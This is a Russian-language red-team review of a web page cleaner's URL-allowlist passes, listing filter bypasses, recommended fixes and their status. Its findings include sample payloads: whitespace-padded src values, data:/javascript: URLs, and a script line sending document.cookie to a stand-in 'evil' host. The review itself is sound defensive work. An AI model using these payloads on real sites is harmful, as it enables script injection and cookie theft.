# Red Team: Тир 2a — allowlist по `src`/`href`

Группа DOM-проходов, решающих судьбу ресурса по его URL через `classifyResource` (белый список):
- [`remove-tracker-scripts.ts`](src/mastra/cleaners/passes/html/remove-tracker-scripts.ts) — `<script src>`
- [`remove-tracker-iframes.ts`](src/mastra/cleaners/passes/html/remove-tracker-iframes.ts) — `<iframe src>`
- [`remove-img-pixels.ts`](src/mastra/cleaners/passes/html/remove-img-pixels.ts) — `<img src>`
- [`remove-tracker-links.ts`](src/mastra/cleaners/passes/html/remove-tracker-links.ts) — `<link>` (stylesheet + preconnect)
- [`remove-inline-trackers.ts`](src/mastra/cleaners/passes/html/remove-inline-trackers.ts) — inline `<script>` (блок-лист)
- [`remove-noscript-trackers.ts`](src/mastra/cleaners/passes/html/remove-noscript-trackers.ts) — `<noscript>` (блок-лист)

**Сильная сторона (зафиксировать):** scripts/iframes/img — образцовый allowlist: trusted → keep,
известный трекер → remove, прочее → **quarantine** (не тихое удаление). Это правильное ядро.
Находки — про вход в `classifyResource` и про два прохода, которые работают по блок-листу.

---

## Находки

### [2A-1] 🔴 Bypass · 🟧 High · URL не нормализуется перед `classifyResource` (T-1 ✅ подтверждён эмпирикой)

- **Сценарий:** `<script src="  https://evil.com/x.js">`, `<img src="\thttps://evil/p.png">`,
  `<script src="https:/⏎/evil.com/x.js">` (внутренний перевод строки).
- **Сейчас:** проходы передают `$(el).attr('src')` в `classifyResource` **как есть**
  ([scripts:13](src/mastra/cleaners/passes/html/remove-tracker-scripts.ts:13),
  [iframes:9](src/mastra/cleaners/passes/html/remove-tracker-iframes.ts:9),
  [img:13](src/mastra/cleaners/passes/html/remove-img-pixels.ts:13)). Замер на cheerio проекта:
  ```
  leading-space src : "  https://evil.com/x.js"   isAbsoluteUrl=false → KEEP
  leading-tab src   : "\thttps://evil.com/p.png"  isAbsoluteUrl=false → KEEP
  internal-newline  : "https:/\n/evil.com/x.js"   isAbsoluteUrl=false → KEEP
  ```
  cheerio **сохраняет** пробел/таб/перевод строки; `isAbsoluteUrl` (`^https?://`) не матчит → keep.
- **Последствие:** ресурс остаётся в чистом лендинге, а браузер по URL-спецификации обрезает
  ведущие пробелы и вырезает внутренние `\t\r\n` → грузит `evil.com`. Сквозной обход белого списка
  одним символом. Это эксплуатируемая форма [AL-2](allowlist.md).
- **Рекомендация:** нормализовать URL в начале `classifyResource` (`trim()` + удалить `[\t\r\n]`).
  Фикс — в `allowlist.ts` (одно место покрывает все проходы).
- **Уверенность:** подтверждено замером (cheerio + isAbsoluteUrl).

### [2A-2] 🔴 Bypass · 🟧 High · `data:`/`javascript:`/`blob:` в `src` проходят как keep (T-3, для 2a)

- **Сценарий:** `<iframe src="data:text/html;base64,PHNjcmlwdD4…">`,
  `<script src="data:text/javascript,fetch('//evil?'+document.cookie)">`.
- **Сейчас:** проходы зовут `classifyResource`, а тот для не-`http(s)`/`//` схем возвращает keep
  ([AL-1](allowlist.md)). Ни один проход 2a схему отдельно не проверяет.
- **Последствие:** `<iframe src="data:text/html,…">` рендерит произвольный HTML/JS атакующего;
  `<script src="data:…">` исполняет код — всё переживает 2a. Остаётся проверить 2d
  (`strip-event-attrs`/`remove-inline-exfil`) — ловят ли они схему; если нет — дыра полная.
- **Рекомендация:** в `classifyResource` для `script`/`iframe`/`media` классифицировать
  `data:`/`blob:`/`javascript:`/`vbscript:` как quarantine (фикс в `allowlist.ts`).
- **Уверенность:** подтверждено чтением кода; полнота дыры — после 2d (нить T-3 остаётся открытой до 2d).

### [2A-3] 🔴 Bypass · 🟨 Medium · `<link rel=preconnect/preload>` — блок-лист, не белый список

- **Сейчас:** для `PRECONNECT_RELS` (`dns-prefetch/preconnect/prefetch/preload`)
  `remove-tracker-links` удаляет только если `urlMatchesTracker(href)` — **блок-лист**
  ([:17–24](src/mastra/cleaners/passes/html/remove-tracker-links.ts:17)). `classifyResource` к ним
  НЕ применяется.
- **Последствие:** `<link rel="preconnect" href="https://evil-analytics.xyz">` или
  `<link rel="preload" as="script" href="https://evil/x.js">` с **неизвестным** хостом → не матчит
  блок-лист → **kept**. preconnect сливает сигнал соединения; preload **скачивает** ресурс на хост
  атакующего. Также `rel="modulepreload"` не покрыт (ни stylesheet, ни preconnet-ветка), и
  мульти-значный `rel="preload stylesheet"` проваливается мимо обеих веток.
- **Рекомендация:** применять `classifyResource` (по типу из `as`/rel) и к preload/preconnect;
  обрабатывать мульти-значный `rel` и `modulepreload`.
- **Уверенность:** подтверждено чтением кода.

### [2A-4] 🔴 Bypass · 🟨 Medium · `<noscript>` allowlist-слеп (T-6 ✅ резолвлен, переформулирован)

- **Сейчас:** `removeNoscriptTrackers` берёт `$(el).html()` (текстовое содержимое noscript, см.
  [DOM-3](html-dom.md)) и матчит **блок-лист** `TRACKER_NOSCRIPT_KEYWORDS` (13 слов)
  ([:8–9](src/mastra/cleaners/passes/html/remove-noscript-trackers.ts:8)). Хорошая новость: текст
  он видит (селекторная ловушка DOM-3 обойдена). Плохая: применяется только блок-лист.
- **Последствие:** `<noscript><img src="//evil-analytics.xyz/p"></noscript>` или iframe с
  **неизвестным** хостом → ключевые слова не совпали → `<noscript>` остаётся целиком. Это
  единственное место, где белый список **вообще не работает** — чистый блок-лист. Плюс грубость:
  при совпадении удаляется весь `<noscript>`, включая легитимный fallback-контент.
- **Рекомендация:** парсить текст noscript вложенным `cheerio.load` и прогонять те же allowlist-проходы
  (scripts/iframes/img) по его содержимому, а не блок-лист по строке.
- **Уверенность:** подтверждено чтением кода + замером DOM-3.

### [2A-5] 🟢 Soundness/граница · 🟨 Medium · `remove-inline-trackers` — только известные вендор-сниппеты

- **Сейчас:** `$('script:not([src])')` + `inlineLooksLikeTracker` = подстрочный **блок-лист**
  `TRACKER_INLINE_KEYWORDS` ([:11](src/mastra/cleaners/passes/html/remove-inline-trackers.ts:11)).
- **Последствие:** inline-скрипт с **кастомным/обфусцированным** exfil без знакомых ключевых слов
  → не удаляется здесь. Это **граница ответственности**: реальная защита от inline-exfil — AST-проход
  2d (`remove-inline-exfil-pass`). Зафиксировать, чтобы не считать этот проход защитой от exfil.
  Плюс FP: `dataLayer.push`/`window.dataLayer` в легитимном коде → удаление всего скрипта.
- **Рекомендация:** в документации развести «удаление известных вендор-сниппетов» (этот проход) и
  «AST-защита от exfil» (2d). FP по `dataLayer` — оценить при ревью 2d.
- **Уверенность:** подтверждено чтением кода.

---

## Резолвы сквозных нитей

- **T-1 ✅** подтверждён эмпирикой (2A-1) — фикс в `allowlist.ts`.
- **T-2 ✅ резолвлен (риск снижен):** `isExternalUrl` из `url.ts` **не** решает судьбу
  `<script>/<iframe>/<img>` — там везде `classifyResource`. Он используется лишь в `remove-meta-refresh`
  (2b), CSS `@import` (Тир 4), `clean-svg` (Тир 4). Расхождение URL-2 в исполняемые ресурсы не
  протекает; унификацию оракулов оставляем как гигиену, severity ниже.
- **T-3 (открыт до 2d):** в 2a `data:`/`javascript:` проходят (2A-2). Финал — после `strip-event-attrs`
  и `remove-inline-exfil` (2d).
- **T-6 ✅** резолвлен и переформулирован (2A-4): не «селекторы не видят», а «применён только блок-лист».

## Пробелы в тестах

Нужны: 2A-1 (whitespace в `src` → должен уходить в quarantine/remove), 2A-2 (`data:`/`javascript:`
в script/iframe), 2A-3 (preconnect/preload на неизвестный хост; `modulepreload`; мульти-`rel`),
2A-4 (неизвестный пиксель в `<noscript>`).

## Итог

1. **2A-1 + 2A-2** — закрываются в `allowlist.ts` (нормализация URL + классификация схемы); эти
   проходы — место, где обе дыры доходят до браузера. Подтверждено сквозь.
2. **2A-3 / 2A-4** — распространить белый список на preconnect/preload и на содержимое `<noscript>`
   (сейчас там блок-лист → неизвестное проходит).

---

## ✅ Статус фиксов (C1)

- **2A-1 ✅** — `classifyResource` теперь нормализует `src` (trim + вырезание `\t\r\n`), поэтому
  `remove-tracker-{scripts,iframes}` и `remove-img-pixels` видят тот же URL, что и браузер →
  whitespace-обход закрыт. Фикс централизован в `allowlist.ts` (см. [allowlist.md](allowlist.md)).
- **2A-2 ✅** — `data:`/`javascript:`/`blob:` в `<script>`/`<iframe>` src → теперь `quarantine`
  (классификация схемы в `allowlist.ts`); проходят через те же `classifyResource`-вызовы 2a.
- **2A-3 ✅** — `remove-tracker-links` переписан на белый список: все ресурс-несущие `rel`
  (stylesheet / preload / modulepreload / prefetch / preconnect / dns-prefetch) идут через
  `classifyResource` (kind по `as`: style→stylesheet, image→img, video/audio→media, font→stylesheet,
  иначе→script; modulepreload→script; preconnect/dns-prefetch→preconnect). Неизвестный хост preload/
  preconnect → карантин (раньше keep — а preload СКАЧИВАЕТ ресурс). Мульти-значный `rel` и
  `modulepreload` теперь покрыты. Прочие rel (icon/canonical/manifest) не трогаем. Тесты:
  `remove-tracker-links.test.ts` (11).
- **2A-4 ✅** — `remove-noscript-trackers` больше не блок-лист: содержимое `<noscript>` (которое внешний
  парсер держит текстом) разбирается вложенным `parseFragment` (новые `parseFragment`/`serializeFragment`
  в `html-dom.ts`), и `script[src]`/`iframe[src]`/`img[src]` внутри идут через `classifyResource`. Опасные/
  чужие узлы вырезаются ХИРУРГИЧНО (через `quarantineNode`), легитимный fallback (текст, локальный/trusted
  `<img>`) сохраняется; пустой noscript удаляется. Неизвестный пиксель/iframe в noscript теперь ловится
  (практически закрывает и DOM-3). Тесты: `remove-noscript-trackers.test.ts` (6).
- **2A-5** — НЕ трогали (граница: AST-защита от inline-exfil — это 2d); остаётся 🆕.
